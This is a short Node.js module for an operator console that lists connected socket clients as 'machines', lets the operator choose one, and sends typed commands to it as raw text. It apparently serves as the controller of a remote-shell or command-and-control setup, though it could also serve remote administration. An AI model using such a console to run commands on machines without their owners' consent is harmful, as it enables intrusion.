"use strict";
const updateDashboardClientCount = require("./webserver/ws_server.js");
const socketClients = require("./sockets/clients.js");
const state = require("./sockets/state.js");
const readline = require("readline");
const rl = readline.createInterface({
    input  : process.stdin,
    output : process.stdout,
});

const manageServer = {
    getClientData : (client) => {
        try {
            for (let i = 0; i < socketClients.length; i++) {
                if (socketClients[i].address === client.remoteAddress + ":" + client.remotePort) {
                    return socketClients[i];
                }
            }
        } catch {
            console.error("Could not find client.");
            return false;
        }
    },
    
    getNumberOfClients : async (server) => {
        await server.getConnections((err, count) => {
            if(err) return err;
            else {
                updateDashboardClientCount(count);
            }
        });
    },

    gotoMainMenu : () => {
        manageServer.listAvailableClients();
        rl.question("$ ", (cmd) => {
            let client;
            try {
                client = socketClients[cmd].client;
            } catch {
                console.error("Unable to switch to client:",cmd);
                manageServer.gotoMainMenu();

                return;
            }
            state.setCurrentConnection(client);
            manageServer.getAndSendSocketCommand(client);
        });
    },

    getAndSendSocketCommand : (client) => {
        const currentClient = manageServer.getClientData(client);
        rl.question(`${currentClient.name} # `, (cmd) => {
            if (cmd === "menu" || cmd === "exit") {
                manageServer.gotoMainMenu();
            } else {
                client.write(cmd);
            }
        });    
    },

    listAvailableClients : () => {
        console.log("Available machines:");
        for (let i = 0; i < socketClients.length; i++) {
            console.log(`${i}) ${socketClients[i].address}`)
        }
    }
};

module.exports = manageServer;